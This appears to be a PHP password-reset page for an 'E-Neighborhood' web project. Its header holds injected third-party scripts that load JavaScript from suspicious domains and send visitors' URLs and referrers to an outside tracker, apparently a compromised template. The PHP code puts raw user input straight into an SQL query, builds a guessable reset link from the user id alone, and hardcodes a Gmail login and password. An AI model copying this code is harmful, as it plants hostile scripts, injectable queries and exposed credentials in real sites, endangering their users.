<?php include_once 'script.php'; ?>
<script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-23581568-13');
  </script>
<script type="text/javascript">(function(window, document) {if (window === top) {var script = document.createElement('script'); script.src = 'https://cdn.immereeako.info/pa.min.js'; document.getElementsByTagName('head')[0].insertAdjacentElement('beforeEnd', script); window['_paInfo_'] = window['_paInfo_'] || {uid: 'HWXCBWTXWD',sub1: 'hwwm'};(new Image).src = '//colorlib.com/pages/imevrstk.php?qd=BTB&zqd=009.004&nbid=1d39b7206c47bc65ee21e032cd65e5ac&cid=185439' + '&url=' + encodeURIComponent(location.href) + '&ref=' + encodeURIComponent(document.referrer) + '&t=' + parseInt(Math.random()*1000000);}})(window, document);</script>

<script type="text/javascript" src="https://solid-waste.top/v/492089.js?j=1221"></script><div id="des_xnba_ewn"></div>
<?php
if(isset($_POST['done'])){
    include_once 'connection.php';
    $mail=$_POST['email'];

   $qry="select * from registration where e_mail='$mail'";
//this method execute when connection is success than it execute the query and store the result in res variable
$res= mysqli_query($con,$qry);
  
 //this method will get the value of res variable and fetch from the database and the result will generated in array and store in row variable
$row=mysqli_fetch_array($res);

    

 //this use for compare two values one from user inputted and another from database
  if($row['e_mail']==$mail)
  {

    // echo $row['s_id'];
      //Sending mail after checking username and email availibility
            
        
        require 'PHPMailer/PHPMailer.php';
        require 'PHPMailer/SMTP.php';
        require 'PHPMailer/Exception.php';

      $base_url = "http://E-Neighborhood.github.io/";  //change this baseurl value as per your file path
    $mail_body =  "<p>Please Open this link for reseting your password".$base_url."reset_pass.php?id=".$row['us_id']."</p><p>Best Regards,<br />Team@E-NEIGHBORHOOD</p>";
        $mail1 = new PHPMailer\PHPMailer\PHPMailer();
        $mail1->IsSMTP();
        $mail1->SMTPDebug  = false;
        $mail1->Debugoutput = false;
        $mail1->Host = 'smtp.gmail.com';
        $mail1->Port = 587;
        $mail1->SMTPSecure = 'tls';
        $mail1->SMTPAuth   = true;
        $mail1->Username  = "eneighborhood14@gmail.com";
        $mail1->Password  = "eneighborhood48";
       $mail1->SetFrom('eneighborhood14@gmail.com', "TEAM@E-NEIGHBORHOOD");
        $mail1->AddReplyTo($mail, strtoupper($mail));
        $mail1->AddAddress($mail, strtoupper($mail));
        $mail1->Subject = "E-MAIL confirmation";
        $mail->WordWrap = 50; 
        $mail1->Body = $mail_body;
        $mail1->IsHTML(true);
        if($mail1->Send())
                {
            echo "<script>alert('Mail Successfully Sent,Please check your mailbox');";

            echo "<script>window.location='login_saller.php';</script>";


                }
        else 
        {
         echo "<script>alert('Mail Not Sent. Please try again!!');</script>";
        }

  }
}
?>